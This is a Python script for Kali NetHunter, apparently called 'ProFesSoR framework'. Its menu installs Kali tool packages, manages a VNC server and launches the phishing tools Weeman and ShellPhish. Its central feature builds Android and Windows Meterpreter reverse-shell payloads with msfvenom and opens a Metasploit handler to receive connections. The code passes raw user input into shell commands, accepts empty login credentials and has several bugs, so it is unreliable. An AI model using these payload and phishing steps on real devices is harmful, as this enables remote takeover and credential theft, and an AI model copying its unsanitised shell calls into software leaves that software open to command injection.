#!/usr/bin/python3
import os, sys, time, requests
def program():
    paththisfile="/root/Nethunter-Automationstart.py"
    uname=""
    pasw=""
    bl='\033[1;90m'
    rd='\033[1;91m'
    gn='\033[1;92m'
    orn='\033[1;93m'
    blu='\033[1;94m'
    prpl='\033[1;95m'
    cyn='\033[1;96m'
    wht='\033[1;97m'
    ylw='\033[1;34m'
    ss=prpl+"["+rd+"+"+prpl+"]"
    def restart():
        os.system("clear")
        print("")
        print("")
        load_stc()
        banner("v3.1")
        info()
        menu()
        inpul()
    def internetconnection():
        url="https://google.com"
        timt=1
        try:
            req = requests.get(url, timeout=timt)
            print(gn+"         Internet Connected !")
            print("")
        except (requests.ConnectionError, requests.Timeout) as exception:
            print(rd+"         No Internet Connected !")
            print("")

    def login(param):
        os.system("clear")
        print("")
        print("")
        print(gn+"       +++++++++++++++++++++++++++")
        print("       +++++++++++++"+rd+"LOGIN"+gn+"++++++++++++")
        print("          +++++++++++++++++++++++++++")
        print("")
        username = input(rd+"[+]Enter Username : "+bl)
        passwd = input(rd+"[+]Enter Password : "+bl)
        if username==uname and passwd==pasw:
           print("")
           print(gn+"   LOGIN SUCCESSFULL")
           os.system("nano "+paththisfile)
        else:
           print("")
           print(rd+"   LOGIN FAILED")
           restart()
    def kexstart():
        print("")
        print('')
        print(cyn+"    ENTER THE PORT NUMBER TO START KEX ON THAT PORT")
        print("")
        kask=input(rd+"[+]root@start ==> ")
        os.system("vncserver :"+kask+" -localhost yes")
        print("")
        print("VNC Kex started at "+kask+" port")
        restart()
    def kstop():
        print("")
        print("")
        print(gn+"ENTER THE PORT NUMBER THAT IS RUNNING TO STOP")
        ksstop=(input(rd+"[+]root@kex : "))
        os.system("vncserver -kill :"+ksstop)
        print()
        print("VNC SERVER STOPPED AT "+ksstop+" PORT")
        print("")
        restart()
    def kex():
        os.system("clear")
        print("")
        print(gn+"        **********************")
        print("")
        print(cyn+"           Vnc Server (Kex)")
        print("")
        print(gn+"        **********************")
        print()
        print()
        print(prpl+"        1."+orn+" Kex Start")
        print(prpl+"        2."+orn+" Kex Stop")
        print(prpl+"        3."+orn+"Exit")
        print("")
        kask=(input(rd+"[+]root@kex : "))
        if kask=="1":
           kstart()
        elif kask=="2":
             kstop()
        elif kask=="3":
             restart()
        else:
            print("Enter Correct Value ! ")
            print("")
            time.sleep(1)
            restart()
    def tools():
        os.system("clear")
        print("")
        print(bl+"        ++++++++++++++++++++++++++++++++")
        print(gn+"                Tool Install Space")
        print(bl+"        ++++++++++++++++++++++++++++++++")
        print("")
        print(gn+"          1 - "+blu+"BurpSuite.")
        print(gn+"          2 - "+blu+"Wireshark")
        print(gn+"          3 - "+blu+"Telegram")
        pask = input("Enter The Choosed Option : ")
        if pask=='1':
           print("")
           os.system("sudo apt install  burpsuite -y")
           restart()
        elif pask=='2':
           print("")
           os.system("sudo apt install wireshark -y")
           restart()
        elif pask=='3':
             os.system("cd /root")
             os.system(" wget https://updates.tdesktop.com/tlinux/tsetup.1.1.23.tar.xz")
             os.system(" tar -xf tsetup.1.1.23.tar.xz ")
             os.system("cd Telegram")
             os.system("./Telegram")
             print("")
             print("TO START TELEGRAM JUST TYPE THIS COMMAND : ")
             print("")
             print("./root/Telegram")
             restart()
        else:
            print("choose correct value")
            restart()
    def load_stc():
        lowerstr = "ProFesSoR framework is starting..."
        upperstr = lowerstr.upper()
        for x in range (len(lowerstr)):
            s = lowerstr[0:x] + upperstr[x] + lowerstr[x+1:] + '\r'
            sys.stdout.write(s)
            sys.stdout.flush()
            time.sleep(0.1)
    def msfpm():
        os.system("clear")
        print(bl+"                       +++++++++++++++++++++++++++++")
        print(bl+"                       +"+rd+" Metasploit Payload Maker  "+bl+"+")
        print(bl+"                       +++++++++++++++++++++++++++++")
        print("")
        print(gn+"                        1 "+cyn+"Android Payload [.apk]")
        print(gn+"                        2 "+cyn+"Windows Payload[.exe]")
        print(gn+"                        3 "+prpl+"Back To Main")
        inm=input(rd+"[+]root@msfpm : ")
        if inm =='1':
           print ("")
           apkname=input(ss+gn+"Enter Name Of Apk : "+wht)
           host=input(ss+gn+"Enter Your IP Address For Communicate : "+wht)
           port=input(ss+gn+"Enter Port [0000 - 9999] :"+wht)
           print(orn+"Your Apk Payload Will Created On '/sdcard'"+wht)
           os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+host+" lport="+port+" r > /sdcard/"+apkname+".apk")
           def msfpr():
               os.system("clear")
               print(cyn+"[+]"+gn+"Payload Name : "+wht+apkname+".apk")
               print(cyn+"[+]"+gn+"Payload Host : "+wht+host)
               print(cyn+"[+]"+gn+"Payload Port : "+wht+port)
               print(cyn+"[+]"+gn+"Payload Directory : "+wht+"/sdcard")
               l1 = "use exploit/multi/handler"
               l2 = "set payload android/meterpreter/reverse_tcp"
               l3 = "set lhost "+host
               l4 = "set lport "+port
               l5 = "exploit"
               os.system("rm /sdcard/android-payload.rc")
               with open("android-payload.rc",'w') as ql:
                    ql.write('{}\n{}\n{}\n{}\n{}\n'.format(l1,l2,l3,l4,l5))
           msfpr()
           insn = input("[+] Open The Reciever [y/n] ? ")
           if insn =='y' or 'Y':
              filename="android-payload.rc"
              plo = "msfconsole -q -r "+filename
              os.system(plo)
           else:
                print("run manually")
        elif inm == '2':
             print ("")
             exename=input(ss+gn+"Enter Name Of Apk : "+wht)
             whost=input(ss+gn+"Enter Your IP Address For Communicate : "+wht)
             wport=input(ss+gn+"Enter Port [0000 - 9999] :"+wht)
             print(orn+"Your Apk Payload Will Created On '/sdcard'"+wht)
             os.system("msfvenom -p windows/meterpreter/reverse_tcp -a x86 -platform windows -f exe LHOST="+whost+" LPORT="+wport+" -o /sdcard/"+exename+".exe")
             def msfwp():
                 os.system("clear")
                 print(cyn+"[+]"+gn+"Payload Name : "+wht+exename+".exe")
                 print(cyn+"[+]"+gn+"Payload Host : "+wht+whost)
                 print(cyn+"[+]"+gn+"Payload Port : "+wht+wport)
                 print(cyn+"[+]"+gn+"Payload Directory : "+wht+"/sdcard")
                 l11 = "use exploit/multi/handler"
                 l12 = "set payload android/meterpreter/reverse_tcp"
                 l13 = "set lhost "+whost
                 l14 = "set lport "+wport
                 l15 = "exploit"
                 os.system("rm /sdcard/windows-payload.rc")
                 with open("windows-payload.rc",'w') as ql:
                      ql.write('{}\n{}\n{}\n{}\n{}\n'.format(l11,l12,l13,l14,l15))
             msfwp()
             insn1 = input("[+] Open The Reciever [y/n] ? ")
             if insn1 =='y' or 'Y':
                wfilename="windows-payload.rc"
                wplo = "msfconsole -q -r "+wfilename
                os.system(wplo)
             else:
                 print("run manually")
        elif inm == '3':
             restart()
        else:
               print("Enter 1-2")

    def banner(a):
        os.system("clear")
        print('')
        print("                 ####################")
        print("                 #     ProFesSoR    #")
        print("                 #             "+a+" #")
        print("                 ####################")

    def info():
        print("")
        print("           ++++++++++++++++++++++++++++++++++++++++++++")
        print("           + Author Name : Pr  FesS  R")
        print("           + Email       : muhamedlafeer837@gmail.com")
        print("           + Github      : Pr  FesS  R")
        print("           + InstaGram   : ig_lafeer")
        print("           ++++++++++++++++++++++++++++++++++++++++++++")

    def menu():
        print("")
        print("   "+gn+"        1 - "+blu+"HID Permission Enable (666)")
        print("   "+gn+"        2 - "+blu+"Metasploit Android Payload.")
        print("   "+gn+"        3 - "+blu+"Kex (vnc server [start - stop]).")
        print("   "+gn+"        4 - "+blu+"Kali Upgradables.")
        print("   "+gn+"        5 - "+blu+"Kali Tools Install [seperat]")
        print("   "+gn+"        6 - "+blu+"Weeman")
        print("   "+gn+"        7 - "+blu+"ShellPhish")
        print("   "+gn+"        0 - "+blu+"Exit.")
        print("   "+gn+"        f - "+blu+"Bug Fix [Developer].")
        print("")
        print("")
        internetconnection()
    def inpul():
        inp =input(rd+"[+] Enter The Number : ")
        if inp =='1':
           os.system("sudo chmod 666 /dev/hidg*")
           restart()
        elif inp =='2':
             msfpm()
        elif inp =='4':
             metapackages()
        elif inp =='3':
             kex()
        elif inp =='5':
             tools()
        elif inp =='6':
             os.system("weeman")
        elif inp =='7':
             os.system("shellphish")
        elif inp =='0':
             os.system("clear")
        elif inp =='f':
             login("nano "+paththisfile)
        else:
            print(rd+"YOU ENTERED WRONG VALUE !")
            time.sleep(1)
            restart()
    def metapackages():
        os.system("clear")
        print("")
        print(ylw+"           ========================")
        print(gn+"                METAPACKAGES")
        print(ylw+"           ========================")
        print()
        print("")
        print(gn+"            1 - "+bl+"Update And Upgrade")
        print(gn+"            2 - "+bl+"Kali Linux arm")
        print(gn+"            3 - "+bl+"Kali Linux core.")
        print(gn+"            4 - "+cyn+"Kali Linux default")
        print(gn+"            5 - "+cyn+"Kali Linux everything")
        print(gn+"            6 - "+bl+"Kali Linux headless")
        print(gn+"            7 - "+cyn+"Kali Linux large")
        print(gn+"            8 - "+prpl+"Kali Linux nethunter")
        print(gn+"            9 - "+bl+"Kali Linux 802-11")
        print(gn+"           10 - "+bl+"Kali Linux bluetooth")
        print(gn+"           11 - "+bl+"Kali Linux crypto-stego")
        print(gn+"           12 - "+bl+"Kali Linux database")
        print(gn+"           13 - "+bl+"Kali Linux exploitation")
        print(gn+"           14 - "+bl+"Kali Linux forensics")
        print(gn+"           15 - "+bl+"Kali Linux fuzzing")
        print(gn+"           16 - "+bl+"Kali Linux gpu")
        print(gn+"           17 - "+bl+"Kali Linux hardware")
        print(gn+"           18 - "+bl+"Kali Linux information gathering")
        print(gn+"           19 - "+bl+"Kali Linux password")
        print(gn+"           20 - "+bl+"Kali Linux Post exploitation")
        print(gn+"           21 - "+bl+"Kali Linux Reporting")
        print(gn+"           22 - "+bl+"Kali Linux reverse-engeneering")
        print(gn+"           23 - "+bl+"Kali Linux sdr")
        print(gn+"           24 - "+bl+"Kali Linux sniffing spoofing")
        print(gn+"           25 - "+bl+"Kali Linux top10")
        print(gn+"           26 - "+bl+"Kali Linux voip")
        print(gn+"           27 - "+bl+"Kali Linux vulnerability")
        print(gn+"           28 - "+bl+"Kali Linux web")
        print(gn+"           29 - "+bl+"Kali Linux Windows Resource")
        print(gn+"           30 - "+bl+"Kali Linux Wireless")

        def sysup(k):
            os.system("sudo apt install "+k+" -y")
            restart()
        mask = input(ss+rd+"root@internet : ")
        if mask=='1':
           os.system("sudo apt update -y && upgrade -y")
           restart()
        elif mask=="2":
             sysup("kali-linux-arm")
        elif mask=="3":
             sysup("kali-linux-core")
        elif mask=="4":
             sysup("kali-linux-default")
        elif mask=="5":
             sysup("kali-linux-everything")
        elif mask=="6":
             sysup("kali-linux-headless")
        elif mask=="7":
             sysup("kali-linux-large")
        elif mask=="8":
             sysup("kali-linux-nethunter")
        elif mask=="9":
             sysup("kali-tools-802-11")
        elif mask=="10":
             sysup("kali-tools-bluetooth")
        elif mask=="11":
             sysup("kali-tools-crypto-stego")
        elif mask=="12":
             sysup("kali-tools-database")
        elif mask=="13":
             sysup("kali-tools-exploitation")
        elif mask=="14":
             sysup("kali-tools-forensics")
        elif mask=="15":
             sysup("kali-tools-fuzzing")
        elif mask=="16":
             sysup("kali-tools-gpu")
        elif mask=="17":
             sysup("kali-tools-hardware")
        elif mask=="18":
             sysup("kali-tools-information-gathering")
        elif mask=="19":
             sysup("kali-tools-password")
        elif mask=="20":
             sysup("kali-tools-post-exploitation")
        elif mask=="21":
             sysup("kali-tools-reporting")
        elif mask=="22":
             sysup("kali-tools-reverse-engineering")
        elif mask=="23":
             sysup("kali-tools-sdr")
        elif mask=="24":
             sysup("kali-tools-sniffing-spoofing")
        elif mask=="25":
             sysup("kali-tools-top10")
        elif mask=="26":
             sysup("kali-tools-voip")
        elif mask=="27":
             sysup("kali-tools-vulnerability")
        elif mask=="28":
             sysup("kali-tools-web")
        elif mask=="29":
             sysup("kali-tools-windows-resources")
        elif mask=="30":
             sysup("kali-tools-wireless")
        else:
            print(ss+" Enter Correct Value Plz...")

    load_stc()
    banner("v3.1")
    info()
    menu()
    inpul()
    def restart():
        load_stc()
        banner("v3.1")
        info()
        menu()
        inpul()

program()
